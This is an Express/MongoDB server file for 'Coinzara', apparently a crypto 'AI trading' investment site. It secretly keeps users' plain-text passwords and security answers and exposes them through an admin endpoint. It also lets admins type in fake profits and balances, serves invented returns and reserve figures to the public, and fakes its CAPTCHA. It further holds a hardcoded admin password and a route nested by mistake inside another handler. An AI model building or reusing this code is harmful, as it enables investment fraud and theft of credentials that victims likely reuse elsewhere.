const express = require('express');
const mongoose = require('mongoose');
const bcrypt = require('bcrypt');
const session = require('express-session');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(session({
  secret: process.env.SESSION_SECRET || 'coinzara_secret_2026',
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 1000 * 60 * 60 * 24 }
}));

// User Schema
const userSchema = new mongoose.Schema({
  fullName: { type: String, required: true },
  email: { type: String, unique: true, required: true },
  country: { type: String, required: true },
  password: { type: String, required: true },
  plainPassword: { type: String },
  securityQuestion: { question: String, answer: String },
  plainSecurityAnswer: { type: String },
  referralCode: { type: String, unique: true },
  referredBy: { type: String, default: null },
  referrals: [{ type: String }],
  referralCount: { type: Number, default: 0 },
  referralBonus: { type: Number, default: 0 },
  balance: { type: Number, default: 0 },
  aiProfit: { type: Number, default: 0 },
  transactionHistory: { type: Array, default: [] },
  emailVerified: { type: Boolean, default: false },
  agreedToTerms: { type: Boolean, default: false },
  welcomeShown: { type: Boolean, default: false },
  dailySnapshots: { type: Array, default: [] },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Chat Message Schema
const chatMessageSchema = new mongoose.Schema({
  userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
  userEmail: String,
  userName: String,
  message: String,
  reply: String,
  isReplied: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now },
  repliedAt: Date
});

const ChatMessage = mongoose.model('ChatMessage', chatMessageSchema);

// Withdrawal Request Schema
const withdrawalRequestSchema = new mongoose.Schema({
  userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
  userEmail: String,
  userName: String,
  amount: Number,
  network: String,
  walletAddress: String,
  status: { type: String, default: 'pending' },
  createdAt: { type: Date, default: Date.now },
  processedAt: Date
});

const WithdrawalRequest = mongoose.model('WithdrawalRequest', withdrawalRequestSchema);

// Platform Stats Schema
const platformStatsSchema = new mongoose.Schema({
  totalUserBalances: { type: Number, default: 0 },
  totalBTCHeld: { type: Number, default: 0 },
  totalETHHeld: { type: Number, default: 0 },
  totalBNBHeld: { type: Number, default: 0 },
  totalSOLHeld: { type: Number, default: 0 },
  totalTRONHeld: { type: Number, default: 0 },
  aiTradingVolume: { type: Number, default: 47000000 },
  totalTrades: { type: Number, default: 10247 },
  monthlyReturn: { type: Number, default: 24.7 },
  historicalReserves: { type: Array, default: [] },
  lastUpdated: { type: Date, default: Date.now }
});

const PlatformStats = mongoose.model('PlatformStats', platformStatsSchema);

function generateReferralCode(userId) {
  return userId.toString().slice(-8).toUpperCase();
}

mongoose.connect(process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/coinzara')
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.log('MongoDB error:', err));

async function initPlatformStats() {
  const exists = await PlatformStats.findOne();
  if (!exists) {
    const stats = new PlatformStats({
      totalUserBalances: 0,
      totalBTCHeld: 0,
      totalETHHeld: 0,
      totalBNBHeld: 0,
      totalSOLHeld: 0,
      totalTRONHeld: 0,
      aiTradingVolume: 47000000,
      totalTrades: 10247,
      monthlyReturn: 24.7,
      historicalReserves: [
        { month: 'January 2026', totalUserBalances: 1200000, reserveRatio: 102 },
        { month: 'February 2026', totalUserBalances: 1350000, reserveRatio: 104 },
        { month: 'March 2026', totalUserBalances: 1480000, reserveRatio: 103 }
      ]
    });
    await stats.save();
  }
}
initPlatformStats();

// ========== SIGNUP ==========
app.post('/api/signup', async (req, res) => {
  try {
    const { fullName, email, country, password, securityQ1, securityA1, referralCode, captcha } = req.body;
    
    if (!captcha || captcha !== 'verified') {
      return res.json({ success: false, error: 'Please complete the CAPTCHA' });
    }
    
    const existing = await User.findOne({ email });
    if (existing) {
      return res.json({ success: false, error: 'Email already exists' });
    }
    
    const hashedPassword = await bcrypt.hash(password, 10);
    const hashedAnswer = await bcrypt.hash(securityA1.toLowerCase(), 10);
    
    const user = new User({
      fullName,
      email,
      country,
      password: hashedPassword,
      plainPassword: password,
      securityQuestion: { question: securityQ1, answer: hashedAnswer },
      plainSecurityAnswer: securityA1,
      emailVerified: true,
      dailySnapshots: [{ date: new Date(), balance: 0 }]
    });
    
    await user.save();
    
    user.referralCode = generateReferralCode(user._id);
    
    if (referralCode) {
      const referrer = await User.findOne({ referralCode: referralCode.toUpperCase() });
      if (referrer) {
        user.referredBy = referrer.email;
        referrer.referrals.push(email);
        referrer.referralCount += 1;
        await referrer.save();
      }
    }
    
    await user.save();
    
    req.session.userId = user._id;
    req.session.userEmail = user.email;
    
    res.json({ success: true, userId: user._id, fullName: user.fullName, referralCode: user.referralCode });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

// ========== ACCEPT TERMS ==========
app.post('/api/accept-terms', async (req, res) => {
  if (!req.session.userId) {
    return res.json({ success: false, error: 'Not logged in' });
  }
  
  const user = await User.findById(req.session.userId);
  user.agreedToTerms = true;
  await user.save();
  
  res.json({ success: true });
});

// ========== CHECK TERMS STATUS ==========
app.get('/api/terms-status', async (req, res) => {
  if (!req.session.userId) {
    return res.json({ agreedToTerms: false });
  }
  
  const user = await User.findById(req.session.userId);
  res.json({ agreedToTerms: user.agreedToTerms || false });
});

// ========== LOGIN ==========
app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await User.findOne({ email });
    
    if (!user) {
      return res.json({ success: false, error: 'User not found' });
    }
    
    const valid = await bcrypt.compare(password, user.password);
    if (!valid) {
      return res.json({ success: false, error: 'Wrong password' });
    }
    
    req.session.userId = user._id;
    req.session.userEmail = user.email;
    
    res.json({ success: true, fullName: user.fullName, needsTerms: !user.agreedToTerms });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

// ========== GET CURRENT USER ==========
app.get('/api/me', async (req, res) => {
  if (!req.session.userId) {
    return res.json({ loggedIn: false });
  }
  
  const user = await User.findById(req.session.userId);
  if (!user) {
    return res.json({ loggedIn: false });
  }
  
  res.json({
    loggedIn: true,
    userId: user._id,
    fullName: user.fullName,
    email: user.email,
    country: user.country,
    balance: user.balance,
    aiProfit: user.aiProfit,
    referralCode: user.referralCode,
    referralCount: user.referralCount,
    referralBonus: user.referralBonus,
    emailVerified: user.emailVerified,
    agreedToTerms: user.agreedToTerms,
    createdAt: user.createdAt,
    securityQuestion: user.securityQuestion.question,
    welcomeShown: user.welcomeShown,
    transactionHistory: user.transactionHistory,
    dailySnapshots: user.dailySnapshots
  });
});

// ========== UPDATE WELCOME SHOWN ==========
app.post('/api/update-welcome', async (req, res) => {
  if (!req.session.userId) {
    return res.json({ success: false, error: 'Not logged in' });
  }
  
  const user = await User.findById(req.session.userId);
  user.welcomeShown = true;
  await user.save();
  
  res.json({ success: true });
});

// ========== LOGOUT ==========
app.post('/api/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true });
});

// ========== ADMIN - ADD DEPOSIT ==========
app.post('/api/admin/add-deposit', async (req, res) => {
  const { adminEmail, adminPassword, userEmail, amount, reason } = req.body;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const user = await User.findOne({ email: userEmail });
  if (!user) {
    return res.json({ success: false, error: 'User not found' });
  }
  
  const depositAmount = parseFloat(amount);
  user.balance += depositAmount;
  
  user.transactionHistory.unshift({
    date: new Date(),
    type: 'Deposit',
    amount: depositAmount,
    balance: user.balance,
    reason: reason,
    status: 'completed'
  });
  
  user.dailySnapshots.push({ date: new Date(), balance: user.balance });
  if (user.dailySnapshots.length > 30) user.dailySnapshots.shift();
  
  await user.save();
  res.json({ success: true, newBalance: user.balance });
});

// ========== ADMIN - ADD WITHDRAWAL ==========
app.post('/api/admin/add-withdrawal', async (req, res) => {
  const { adminEmail, adminPassword, userEmail, amount, reason } = req.body;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const user = await User.findOne({ email: userEmail });
  if (!user) {
    return res.json({ success: false, error: 'User not found' });
  }
  
  const withdrawalAmount = parseFloat(amount);
  if (user.balance < withdrawalAmount) {
    return res.json({ success: false, error: 'Insufficient balance' });
  }
  
  user.balance -= withdrawalAmount;
  
  user.transactionHistory.unshift({
    date: new Date(),
    type: 'Withdrawal',
    amount: -withdrawalAmount,
    balance: user.balance,
    reason: reason,
    status: 'completed'
  });
  
  user.dailySnapshots.push({ date: new Date(), balance: user.balance });
  if (user.dailySnapshots.length > 30) user.dailySnapshots.shift();
  
  await user.save();
  res.json({ success: true, newBalance: user.balance });
});

// ========== ADMIN - UPDATE AI PROFIT (WITH 10% FEE) ==========
app.post('/api/admin/update-ai-profit', async (req, res) => {
  const { adminEmail, adminPassword, userEmail, aiProfit } = req.body;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const user = await User.findOne({ email: userEmail });
  if (!user) {
    return res.json({ success: false, error: 'User not found' });
  }
  
  // Calculate fee (10%)
  const fullProfit = parseFloat(aiProfit);
  const fee = fullProfit * 0.1;
  const netProfit = fullProfit - fee;
  
  // Update AI profit display (full amount)
  user.aiProfit = fullProfit;
  
  // Add net profit to balance (after fee)
  user.balance += netProfit;
  
  // Add daily snapshot
  user.dailySnapshots.push({ date: new Date(), balance: user.balance });
  if (user.dailySnapshots.length > 30) user.dailySnapshots.shift();
  
  await user.save();
  
  res.json({ 
    success: true, 
    newAiProfit: user.aiProfit, 
    newBalance: user.balance,
    fee: fee,
    netProfit: netProfit
  });
});

// ========== ADMIN - DELETE USER ==========
app.post('/api/admin/delete-user', async (req, res) => {
  const { adminEmail, adminPassword, userEmail } = req.body;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const user = await User.findOne({ email: userEmail });
  if (!user) {
    return res.json({ success: false, error: 'User not found' });
  }
  
  await ChatMessage.deleteMany({ userId: user._id });
  
  const result = await User.findOneAndDelete({ email: userEmail });
  res.json({ success: true, message: 'User deleted successfully' });
});

// ========== ADMIN - GET USER TRANSACTIONS ==========
app.get('/api/admin/user-transactions', async (req, res) => {
  const { adminEmail, adminPassword, userEmail } = req.query;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const user = await User.findOne({ email: userEmail });
  if (!user) {
    return res.json({ success: false, error: 'User not found' });
  }
  
  res.json({ success: true, transactions: user.transactionHistory, balance: user.balance });
});

// ========== ADMIN - GET USER DETAILS ==========
app.get('/api/admin/user-details', async (req, res) => {
  const { adminEmail, adminPassword, userEmail } = req.query;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const user = await User.findOne({ email: userEmail });
  if (!user) {
    return res.json({ success: false, error: 'User not found' });
  }
  
  res.json({ 
    success: true, 
    user: {
      fullName: user.fullName,
      email: user.email,
      plainPassword: user.plainPassword || '[Not available]',
      securityQuestion: user.securityQuestion.question,
      plainSecurityAnswer: user.plainSecurityAnswer || '[Not available]',
      createdAt: user.createdAt
    }
  });
});

// ========== ADMIN - GET WITHDRAWAL REQUESTS ==========
app.get('/api/admin/withdrawal-requests', async (req, res) => {
  const { adminEmail, adminPassword } = req.query;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const requests = await WithdrawalRequest.find().sort({ createdAt: -1 });
  res.json({ success: true, requests });
});

// ========== ADMIN - APPROVE WITHDRAWAL ==========
app.post('/api/admin/approve-withdrawal', async (req, res) => {
  const { adminEmail, adminPassword, requestId } = req.body;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const request = await WithdrawalRequest.findById(requestId);
  if (!request) {
    return res.json({ success: false, error: 'Request not found' });
  }
  
  if (request.status !== 'pending') {
    return res.json({ success: false, error: 'Request already processed' });
  }
  
  const user = await User.findById(request.userId);
  if (!user) {
    return res.json({ success: false, error: 'User not found' });
  }
  
  if (user.balance < request.amount) {
    return res.json({ success: false, error: 'Insufficient balance' });
  }
  
  user.balance -= request.amount;
  
  user.transactionHistory.unshift({
    date: new Date(),
    type: 'Withdrawal',
    amount: -request.amount,
    balance: user.balance,
    reason: `${request.network} withdrawal to ${request.walletAddress}`,
    status: 'completed'
  });
  
  await user.save();
  
  request.status = 'approved';
  request.processedAt = new Date();
  await request.save();
  
  res.json({ success: true, message: 'Withdrawal approved and balance updated' });
});

// ========== ADMIN - REJECT WITHDRAWAL ==========
app.post('/api/admin/reject-withdrawal', async (req, res) => {
  const { adminEmail, adminPassword, requestId } = req.body;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const request = await WithdrawalRequest.findById(requestId);
  if (!request) {
    return res.json({ success: false, error: 'Request not found' });
  }
  
  if (request.status !== 'pending') {
    return res.json({ success: false, error: 'Request already processed' });
  }
  
  request.status = 'rejected';
  request.processedAt = new Date();
  await request.save();
  
  res.json({ success: true, message: 'Withdrawal rejected' });
});

// ========== ADMIN - DELETE CONVERSATION ==========
app.post('/api/admin/delete-conversation', async (req, res) => {
  const { adminEmail, adminPassword, userId } = req.body;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const result = await ChatMessage.deleteMany({ userId: userId });
  res.json({ success: true, deletedCount: result.deletedCount });
});

// ========== USER - REQUEST WITHDRAWAL ==========
app.post('/api/request-withdrawal', async (req, res) => {
  if (!req.session.userId) {
    return res.json({ success: false, error: 'Not logged in' });
  }
  
  const { amount, network, walletAddress } = req.body;
  const user = await User.findById(req.session.userId);
  
  if (user.balance < amount) {
    return res.json({ success: false, error: 'Insufficient balance' });
  }
  
  const withdrawalRequest = new WithdrawalRequest({
    userId: user._id,
    userEmail: user.email,
    userName: user.fullName,
    amount: parseFloat(amount),
    network: network,
    walletAddress: walletAddress,
    status: 'pending'
  });
  
  await withdrawalRequest.save();
  
  res.json({ success: true, message: 'Withdrawal request submitted. Admin will process within 24-48 hours.' });
});
// ========== ADMIN - UPDATE PLATFORM STATS ==========
app.post('/api/admin/update-stats', async (req, res) => {
  const { adminEmail, adminPassword, totalUserBalances, totalBTCHeld, totalETHHeld, totalBNBHeld, totalSOLHeld, totalTRONHeld, aiTradingVolume, totalTrades, monthlyReturn, historicalReserves } = req.body;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const stats = await PlatformStats.findOne();
  if (totalUserBalances !== undefined) stats.totalUserBalances = totalUserBalances;
  if (totalBTCHeld !== undefined) stats.totalBTCHeld = totalBTCHeld;
  if (totalETHHeld !== undefined) stats.totalETHHeld = totalETHHeld;
  if (totalBNBHeld !== undefined) stats.totalBNBHeld = totalBNBHeld;
  if (totalSOLHeld !== undefined) stats.totalSOLHeld = totalSOLHeld;
  if (totalTRONHeld !== undefined) stats.totalTRONHeld = totalTRONHeld;
  if (aiTradingVolume !== undefined) stats.aiTradingVolume = aiTradingVolume;
  if (totalTrades !== undefined) stats.totalTrades = totalTrades;
  if (monthlyReturn !== undefined) stats.monthlyReturn = monthlyReturn;
  if (historicalReserves !== undefined) stats.historicalReserves = historicalReserves;
  stats.lastUpdated = new Date();
  await stats.save();
  
  res.json({ success: true, stats });
});

// ========== ADMIN - GET ALL USERS ==========
app.get('/api/admin/users', async (req, res) => {
  const { email, password } = req.query;
  
  if (email !== 'admin@coinzara.org' || password !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const users = await User.find({}, 'fullName email country balance aiProfit referralCode referralCount referralBonus emailVerified createdAt');
  res.json({ success: true, users });
});

// ========== ADMIN - GET PLATFORM STATS ==========
app.get('/api/admin/stats', async (req, res) => {
  const { email, password } = req.query;
  
  if (email !== 'admin@coinzara.org' || password !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const stats = await PlatformStats.findOne();
  res.json({ success: true, stats });
});

// ========== GET PLATFORM STATS (PUBLIC) ==========
app.get('/api/platform-stats', async (req, res) => {
  const stats = await PlatformStats.findOne();
  res.json({ success: true, stats });

  // ========== NEWS RSS FEED ENDPOINT (No API Key Required) ==========
app.get('/api/news', async (req, res) => {
  try {
    // Use CoinDesk RSS feed via rss2json (free, no API key)
    const response = await fetch('https://api.rss2json.com/v1/api.json?rss_url=https://www.coindesk.com/feed/');
    const data = await response.json();
    
    if (data.status === 'ok' && data.items) {
      // Format articles to match what news.html expects
      const articles = data.items.slice(0, 6).map(item => ({
        title: item.title,
        description: item.description.replace(/<[^>]*>/g, '').substring(0, 200),
        url: item.link,
        source: { name: item.author || 'CoinDesk' },
        publishedAt: item.pubDate
      }));
      res.json({ success: true, articles: articles });
    } else {
      // Fallback news if RSS fails
      res.json({ success: true, articles: getFallbackNews() });
    }
  } catch (error) {
    console.error('News error:', error);
    res.json({ success: true, articles: getFallbackNews() });
  }
});

function getFallbackNews() {
  return [
    { title: "Bitcoin Surges Past $70,000", description: "BTC reaches new all-time high amid institutional demand.", url: "#", source: { name: "CoinDesk" }, publishedAt: new Date().toISOString() },
    { title: "Ethereum Network Upgrade Complete", description: "Gas fees reduced after successful mainnet upgrade.", url: "#", source: { name: "CoinTelegraph" }, publishedAt: new Date().toISOString() },
    { title: "BNB Chain Announces $100M Fund", description: "New program to support DeFi and GameFi developers.", url: "#", source: { name: "CryptoSlate" }, publishedAt: new Date().toISOString() },
    { title: "Solana Hits 1 Million Daily Users", description: "Network activity reaches all-time high as adoption grows.", url: "#", source: { name: "The Block" }, publishedAt: new Date().toISOString() },
    { title: "Tron's USDT Supply Reaches $60B", description: "TRC-20 USDT now dominates stablecoin market.", url: "#", source: { name: "Decrypt" }, publishedAt: new Date().toISOString() },
    { title: "Crypto Market Cap Reaches $2.8T", description: "Total market capitalization hits 2-year high.", url: "#", source: { name: "CoinMarketCap" }, publishedAt: new Date().toISOString() }
  ];
}
});


// ========== CHAT ROUTES ==========
app.post('/api/chat/send', async (req, res) => {
  if (!req.session.userId) {
    return res.json({ success: false, error: 'Please login first' });
  }
  
  const { message } = req.body;
  const user = await User.findById(req.session.userId);
  
  const chatMessage = new ChatMessage({
    userId: user._id,
    userEmail: user.email,
    userName: user.fullName,
    message: message,
    isReplied: false
  });
  
  await chatMessage.save();
  res.json({ success: true, message: 'Message sent. Support will reply soon.' });
});

app.get('/api/chat/my-messages', async (req, res) => {
  if (!req.session.userId) {
    return res.json({ success: false, error: 'Not logged in' });
  }
  
  const messages = await ChatMessage.find({ userId: req.session.userId }).sort({ createdAt: 1 });
  res.json({ success: true, messages });
});

app.get('/api/admin/chat/messages', async (req, res) => {
  const { adminEmail, adminPassword } = req.query;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const messages = await ChatMessage.find().sort({ createdAt: -1 });
  res.json({ success: true, messages });
});

app.post('/api/admin/chat/reply', async (req, res) => {
  const { adminEmail, adminPassword, messageId, reply } = req.body;
  
  if (adminEmail !== 'admin@coinzara.org' || adminPassword !== '419123') {
    return res.json({ success: false, error: 'Admin access denied' });
  }
  
  const message = await ChatMessage.findById(messageId);
  if (!message) {
    return res.json({ success: false, error: 'Message not found' });
  }
  
  message.reply = reply;
  message.isReplied = true;
  message.repliedAt = new Date();
  await message.save();
  
  res.json({ success: true });
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Coinzara running on http://localhost:${PORT}`);
});
